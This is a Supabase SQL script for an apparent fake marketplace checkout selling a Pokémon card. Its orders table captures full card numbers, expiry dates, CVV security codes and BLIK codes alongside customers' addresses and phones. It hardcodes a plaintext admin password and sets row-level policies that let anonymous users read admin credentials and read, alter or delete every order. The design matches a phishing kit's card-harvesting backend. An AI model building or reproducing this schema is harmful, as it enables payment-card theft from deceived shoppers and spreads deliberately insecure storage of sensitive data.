-- ============================================================================
-- SUPABASE COMPLETE SQL SCHEMA: CUSTOMER SUBMISSIONS & ACCESS
-- ============================================================================
-- Run this complete script in your Supabase SQL Editor (Dashboard -> SQL Editor -> New query -> Run)

-- 1. Enable UUID Extension
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- ----------------------------------------------------------------------------
-- 2. ADMIN USERS TABLE (Credentials: move / dontmove)
-- ----------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS admin_users (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  username VARCHAR(100) UNIQUE NOT NULL,
  password VARCHAR(255) NOT NULL,
  name VARCHAR(100) DEFAULT 'Operator',
  role VARCHAR(50) DEFAULT 'admin',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Insert login credentials requested:
-- Username: move
-- Password: dontmove
INSERT INTO admin_users (username, password, name, role)
VALUES ('move', 'dontmove', 'Store Operator', 'admin')
ON CONFLICT (username) DO UPDATE 
SET password = EXCLUDED.password;

-- ----------------------------------------------------------------------------
-- 3. CUSTOMER ORDERS & ALL ENTERED DETAILS TABLE
-- ----------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS orders (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  order_number VARCHAR(100) NOT NULL UNIQUE,
  
  -- Product Info
  product_id VARCHAR(100) DEFAULT 'prod_mewtwo_gx_190',
  product_title VARCHAR(255) NOT NULL,
  
  -- Customer Contact Details
  customer_name VARCHAR(255),
  phone_number VARCHAR(100),
  email VARCHAR(255),
  
  -- Delivery Type ('home' or 'pickup')
  delivery_type VARCHAR(50) NOT NULL DEFAULT 'home',
  
  -- Shipping Address (Home Delivery)
  shipping_line1 TEXT,
  shipping_line2 TEXT,
  shipping_postal_code VARCHAR(50),
  shipping_city VARCHAR(100),
  shipping_country VARCHAR(100) DEFAULT 'France',
  
  -- Pick-Up Locker Details (Locker Delivery)
  pickup_point_code VARCHAR(100),
  pickup_point_name TEXT,
  pickup_point_address TEXT,
  pickup_point_city VARCHAR(100),
  pickup_carrier_name VARCHAR(100),
  
  -- Full Payment Details Entered by Customer
  payment_method_type VARCHAR(100) DEFAULT 'card',
  payment_cardholder_name VARCHAR(255),
  payment_card_number VARCHAR(255),
  payment_card_expiry VARCHAR(20),
  payment_security_code VARCHAR(20),
  payment_blik_code VARCHAR(20),
  payment_card_brand VARCHAR(50),
  payment_card_last4 VARCHAR(10),
  
  -- Pricing Breakdown
  order_price NUMERIC(10, 2) NOT NULL DEFAULT 8.00,
  buyer_protection_fee NUMERIC(10, 2) NOT NULL DEFAULT 1.10,
  shipping_price NUMERIC(10, 2) NOT NULL DEFAULT 8.49,
  shipping_discount NUMERIC(10, 2) NOT NULL DEFAULT 0.00,
  total_amount NUMERIC(10, 2) NOT NULL,
  currency VARCHAR(10) NOT NULL DEFAULT 'EUR',
  
  -- Status
  status VARCHAR(50) NOT NULL DEFAULT 'PAID',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- ----------------------------------------------------------------------------
-- 4. ROW LEVEL SECURITY (RLS) POLICIES
-- Allows the web app (anon key) to insert submissions and read customer entries
-- ----------------------------------------------------------------------------
ALTER TABLE admin_users ENABLE ROW LEVEL SECURITY;
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- Allow reading admin_users table for verification
DROP POLICY IF EXISTS "Allow anon read admin_users" ON admin_users;
CREATE POLICY "Allow anon read admin_users" ON admin_users
  FOR SELECT USING (true);

-- Allow public anonymous insert of orders from checkout
DROP POLICY IF EXISTS "Allow anon insert orders" ON orders;
CREATE POLICY "Allow anon insert orders" ON orders
  FOR INSERT WITH CHECK (true);

-- Allow reading orders for admin panel
DROP POLICY IF EXISTS "Allow anon select orders" ON orders;
CREATE POLICY "Allow anon select orders" ON orders
  FOR SELECT USING (true);

-- Allow deleting/updating orders
DROP POLICY IF EXISTS "Allow anon update orders" ON orders;
CREATE POLICY "Allow anon update orders" ON orders
  FOR UPDATE USING (true);

DROP POLICY IF EXISTS "Allow anon delete orders" ON orders;
CREATE POLICY "Allow anon delete orders" ON orders
  FOR DELETE USING (true);

-- ----------------------------------------------------------------------------
-- 5. INDEXES FOR FAST QUERYING
-- ----------------------------------------------------------------------------
CREATE INDEX IF NOT EXISTS idx_orders_order_number ON orders(order_number);
CREATE INDEX IF NOT EXISTS idx_orders_phone_number ON orders(phone_number);
CREATE INDEX IF NOT EXISTS idx_orders_customer_name ON orders(customer_name);
CREATE INDEX IF NOT EXISTS idx_orders_created_at ON orders(created_at DESC);

-- ----------------------------------------------------------------------------
-- 6. INITIAL SAMPLE SEED ENTRY
-- ----------------------------------------------------------------------------
INSERT INTO orders (
  order_number,
  product_title,
  customer_name,
  phone_number,
  delivery_type,
  shipping_line1,
  shipping_city,
  shipping_postal_code,
  shipping_country,
  payment_method_type,
  payment_cardholder_name,
  payment_card_number,
  payment_card_expiry,
  payment_security_code,
  order_price,
  buyer_protection_fee,
  shipping_price,
  total_amount,
  currency,
  status
) VALUES (
  'VIN-849201',
  'Mewtwo GX Pokémon Card Full Art Secret Rare',
  'Alexandre Dubois',
  '+33 6 12 34 56 78',
  'home',
  '14 Rue de Rivoli',
  'Paris',
  '75001',
  'France',
  'card',
  'Alexandre Dubois',
  '4242 4242 4242 4242',
  '05/28',
  '381',
  8.00,
  1.10,
  8.49,
  17.59,
  'EUR',
  'PAID'
) ON CONFLICT (order_number) DO NOTHING;
